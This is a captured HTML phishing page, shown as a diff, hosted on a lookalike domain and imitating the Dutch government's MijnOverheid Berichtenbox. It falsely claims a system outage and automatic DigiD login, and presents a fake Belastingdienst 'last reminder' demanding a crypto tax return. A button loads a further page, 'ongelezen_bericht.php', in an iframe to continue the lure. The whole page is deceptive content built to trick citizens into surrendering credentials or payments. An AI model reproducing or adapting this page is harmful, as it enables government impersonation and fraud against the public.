@@ -1,0 +1,365 @@
+<!-- url: https://mijn.overheid.nl.berichtenbox.l5gtzeulqa6vfxbcwev2bg2xpctug1zf5hbidtmwi7u2ukg986en.tsla.com.br/berichtenbox.php?3kd0ETqog0OaVLUaHVG3UZghEgI7rd96HY3hR6LG5smO9zLiQEQWwOzaQNl3Smff728UYnxGvsypmqQrEOr2XN0ObBNn967lPNSJ82kuGZ1d7bZf6DbAd7GAEWqjlcIizjP3Vz21qXJiNH4ZODK9XBsRHwdfDr2crZlTK83iS4jAtyULEOV4bO57OpUaxzWx5y7KvUTi1rbFEloT1YXuJWrtleiDwn7zrf9ros59LPQ6gXLMRrLW4NCB4B2NPlK0n4003Tr0aYGgLrfQrneulrSgZV9wjWe7KUbIoclv7T4V
+status: 200 -->
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="favicon.ico" rel="shortcut icon" />
+  <title>MijnOverheid</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background-image: url(bg-full.png);
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: #fff;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+      line-height: 1.55;
+    }
+    .page-container {
+      min-height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 16px;
+      box-sizing: border-box;
+    }
+    .logo-container {
+      width: 48px;
+      height: 84px;
+      margin: 0 auto 10px;
+    }
+    .logo-container img {
+      width: 40px;
+      height: 70px;
+      display: block;
+    }
+    .alert-banner {
+      width: 560px;
+      max-width: 100%;
+      margin: 28px auto 30px;
+      padding: 14px 16px;
+      background: #FBEAD9;
+      color: #2b2b2b;
+      border: 1px solid #e7d2be;
+      border-radius: 8px;
+      box-shadow: 0 12px 28px rgba(0,0,0,.18);
+      display: grid;
+      grid-template-columns: auto 1fr;
+      grid-column-gap: 12px;
+      grid-row-gap: 6px;
+      align-items: start;
+      box-sizing: border-box;
+    }
+    .alert-icon {
+      width: 22px;
+      height: 22px;
+      border-radius: 4px;
+      background: #F29900;
+      display: grid;
+      place-items: center;
+    }
+    .alert-icon svg {
+      width: 16px;
+      height: 16px;
+      fill: #fff;
+    }
+    .alert-title {
+      margin: 0;
+      font-size: 16px;
+      line-height: 1.35;
+      font-weight: bold;
+      color: #2b2b2b;
+      align-self: center;
+    }
+    .alert-text {
+      grid-column: 2 / span 1;
+      margin: 1px 0 0;
+      color: #444;
+      font-size: 15px;
+      line-height: 1.45;
+    }
+    .page-title {
+      margin: 6px 0 15px;
+      font-size: 41px;
+      font-weight: bold;
+      color: #fff;
+      line-height: 1.1;
+      text-align: center;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+      letter-spacing: 0.5px;
+    }
+    .page-subtitle {
+      margin: 0 0 15px;
+      color: #ffffff;
+      font-size: 19px;
+      font-weight: normal;
+      line-height: 1.4;
+      text-align: center;
+    }
+    .subtitle-digid { word-break: normal; }
+
+    .intro-wrap {
+      max-width: 80ch;
+      margin: 0 auto 28px;
+    }
+    .intro-wrap .page-subtitle {
+      margin: 8px 0;
+    }
+    .btn-post {
+      background: #E77817;
+      color: #fff;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 10px 0 0;
+      gap: 12px;
+      min-width: 222px;
+      height: 48px;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      box-shadow: 0 8px 22px rgba(0,0,0,.28);
+      transition: background-color .2s ease, box-shadow .2s ease, transform .06s ease;
+      margin-bottom: 14px;
+    }
+    .btn-post:hover { background: #cf6b12; box-shadow: 0 10px 26px rgba(0,0,0,.30); }
+    .btn-post:active { transform: translateY(1px); }
+    .btn-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 4px;
+      display: block;
+    }
+    .modal {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    .modal.is-open { display: flex; }
+    .modal-backdrop {
+      position: absolute;
+      inset: 0;
+      background: rgba(0,0,0,.55);
+      backdrop-filter: blur(1px);
+    }
+    .modal-dialog {
+      position: relative;
+      width: min(860px, calc(100% - 48px));
+      max-height: 90vh;
+      margin: 40px auto;
+      background: #fff;
+      color: #111827;
+      border-radius: 12px;
+      box-shadow: 0 24px 64px rgba(0,0,0,.35);
+      overflow: hidden;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+    }
+    .modal-header-bar {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      padding: 12px 16px;
+      border-bottom: 1px solid #eef0f3;
+      background: #fafafa;
+    }
+    .modal-title {
+      margin: 0;
+      font-size: 16px;
+      font-weight: bold;
+      color: #111827;
+      line-height: 1.4;
+    }
+    .message-meta {
+      margin-top: 6px;
+      font-size: 14px;
+      line-height: 1.5;
+      color: #333;
+    }
+    .message-meta .label {
+      font-weight: bold;
+    }
+    .message-meta .label::after {
+      content: "";
+      display: inline-block;
+      width: 0.4em;
+    }
+    .modal-close {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      border: 1px solid #e5e7eb;
+      background: #fff;
+      color: #374151;
+      display: grid;
+      place-items: center;
+      cursor: pointer;
+    }
+    .modal-close:hover { background: #f3f4f6; }
+    .modal-close svg { width: 18px; height: 18px; }
+    .modal-body { padding: 0; height: 560px; }
+    .modal-iframe { width: 100%; height: 100%; border: 0; display: block; background: #fff; }
+
+    @media (max-width: 1024px) {
+      .page-container { padding-left: 16px; padding-right: 16px; }
+      .alert-banner { width: 700px; max-width: 100%; margin: 24px auto 28px; }
+      .modal-dialog { width: min(860px, calc(100% - 32px)); margin: 20px auto; }
+      .logo-container { width: 44px; height: 78px; }
+      .logo-container img { width: 36px; height: 63px; }
+      .subtitle-digid { display:block; max-width:88%; margin-left:auto; margin-right:auto; }
+    }
+    @media (max-width: 768px) {
+      .page-container { padding-left: 16px; padding-right: 16px; }
+      .alert-banner { width: 100%; margin: 22px auto 26px; padding: 12px 14px; grid-column-gap: 10px; grid-row-gap: 6px; }
+      .alert-title { font-size: 15.5px; }
+      .alert-text { font-size: 14.5px; }
+      .page-title { font-size: 36px; margin: 6px 0 24px; }
+      .page-subtitle { font-size: 17px; margin-bottom: 26px; }
+      .modal-dialog { width: calc(100% - 32px); }
+      .modal-body { height: 70vh; }
+      .logo-container { width: 40px; height: 72px; }
+      .logo-container img { width: 34px; height: 60px; }
+      .subtitle-digid { display:block; max-width:92%; margin-left:auto; margin-right:auto; }
+    }
+    @media (max-width: 640px) {
+      .page-container { padding-left: 14px; padding-right: 14px; }
+      .alert-banner { margin: 20px auto 24px; padding: 12px; border-radius: 8px; }
+      .alert-icon { width: 20px; height: 20px; }
+      .alert-icon svg { width: 14px; height: 14px; }
+      .alert-title { font-size: 15px; }
+      .alert-text { font-size: 14px; }
+      .page-title { font-size: 34px; margin: 6px 0 22px; }
+      .page-subtitle { font-size: 16px; margin-bottom: 24px; }
+      .modal-dialog { width: calc(100% - 24px); border-radius: 10px; }
+      .modal-body { height: 70dvh; }
+      .subtitle-digid { display:block; max-width:95%; margin-left:auto; margin-right:auto; }
+    }
+    @media (max-width: 480px) {
+      .page-container { padding-left: 12px; padding-right: 12px; }
+      .logo-container { width: 36px; height: 66px; margin-bottom: 12px; }
+      .logo-container img { width: 32px; height: 56px; }
+      .alert-banner { margin: 16px auto 22px; padding: 10px 12px; }
+      .alert-title { font-size: 14.5px; }
+      .alert-text { font-size: 14px; }
+      .page-title { font-size: 32px; margin-bottom: 20px; }
+      .page-subtitle { font-size: 15.5px; margin-bottom: 22px; }
+      .modal-dialog { width: calc(100% - 20px); }
+      .modal-body { height: 70dvh; }
+      .subtitle-digid { display:block; max-width:96%; margin-left:auto; margin-right:auto; }
+    }
+    @media (max-width: 360px) {
+      .alert-banner { margin: 14px auto 20px; padding: 10px; }
+      .alert-title { font-size: 14px; }
+      .alert-text { font-size: 13.5px; }
+      .page-title { font-size: 30px; }
+      .logo-container { width: 34px; height: 62px; }
+      .logo-container img { width: 30px; height: 52px; }
+      .subtitle-digid { display:block; max-width:98%; margin-left:auto; margin-right:auto; }
+    }
+  </style>
+</head>
+<body>
+  <div class="page-container">
+    <div class="logo-container">
+      <img src="3mbYY6e.png" alt="">
+    </div>
+
+    <div class="alert-banner" role="status" aria-live="polite">
+      <span class="alert-icon" aria-hidden="true">
+        <svg viewBox="0 0 24 24">
+          <rect x="11" y="5" width="3" height="9" rx="1.5"></rect>
+          <rect x="11" y="16.5" width="3" height="3" rx="1.5"></rect>
+        </svg>
+      </span>
+      <h5 id="alert-title" class="alert-title"></h5>
+      <p class="alert-text">De Berichtenbox-app is tijdelijk niet beschikbaar vanwege een technische storing. Hierdoor zijn berichten tijdelijk niet zichtbaar. Via de knop &lsquo;Bekijk uw bericht&rsquo; kunt u uw bericht(en) bekijken. Onze excuses voor het ongemak.</p>
+    </div>
+
+    <h1 class="page-title">MijnOverheid</h1>
+
+    <div class="intro-wrap">
+      <p class="page-subtitle">Post van de overheid digitaal ontvangen.</p>
+      <p class="page-subtitle">Er staat een document voor u klaar in uw Berichtenbox van de Belastingdienst.</p>
+      <p class="page-subtitle subtitle-digid">Op basis van uw recente DigiD-inlog op MijnOverheid bent u automatisch ingelogd en kunt u het bericht direct bekijken.</p>
+    </div>
+
+    <div>
+      <button type="button" class="btn-post" data-post-modal data-url="ongelezen_bericht.php" aria-haspopup="dialog" aria-controls="post-modal">
+        <img src="7-t9zX-QMufD.png" alt="" class="btn-icon">
+        Bekijk uw bericht
+      </button>
+    </div>
+  </div>
+
+  <div class="modal" id="post-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" aria-hidden="true">
+    <div class="modal-backdrop" data-close></div>
+    <div class="modal-dialog" role="document">
+      <div class="modal-header-bar">
+        <div>
+          <h2 class="modal-title" id="modal-title">Mijn Berichtenbox (1)</h2>
+          <div class="message-meta">
+            <div><span class="label">Datum:</span><span id="msg-date"></span></div>
+            <div><span class="label">Tijd:</span><span id="msg-time"></span></div>
+            <div><span class="label">Afzender:</span>Belastingdienst</div>
+            <div><span class="label">Onderwerp:</span>Laatste herinnering &mdash; Crypto-aangifte vereist</div>
+          </div>
+        </div>
+        <button class="modal-close" type="button" data-close aria-label="Sluiten">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </button>
+      </div>
+      <div class="modal-body">
+        <iframe class="modal-iframe" src=""></iframe>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      const d = new Date();
+      const dd = String(d.getDate()).padStart(2, '0');
+      const mm = String(d.getMonth() + 1).padStart(2, '0');
+      const yyyy = d.getFullYear();
+      document.getElementById('alert-title').textContent = `${dd}-${mm}-${yyyy} | Onderhoud`;
+      document.getElementById('msg-date').textContent = `${dd}-${mm}-${yyyy}`;
+      document.getElementById('msg-time').textContent = d.toLocaleTimeString('nl-NL', { hour: '2-digit', minute: '2-digit' });
+    })();
+    (function () {
+      const openBtn = document.querySelector('[data-post-modal]');
+      const modal = document.getElementById('post-modal');
+      const iframe = modal.querySelector('.modal-iframe');
+      function openModal() {
+        iframe.src = openBtn.getAttribute('data-url');
+        modal.classList.add('is-open');
+        modal.removeAttribute('aria-hidden');
+      }
+      function closeModal() {
+        modal.classList.remove('is-open');
+        modal.setAttribute('aria-hidden','true');
+        iframe.src = '';
+      }
+      openBtn.addEventListener('click', openModal);
+      modal.addEventListener('click', function (e) {
+        if (e.target.closest('[data-close]') || e.target.classList.contains('modal-backdrop')) {
+          closeModal();
+        }
+      });
+      document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape') closeModal();
+      });
+    })();
+  </script>
+</body>
+</html>
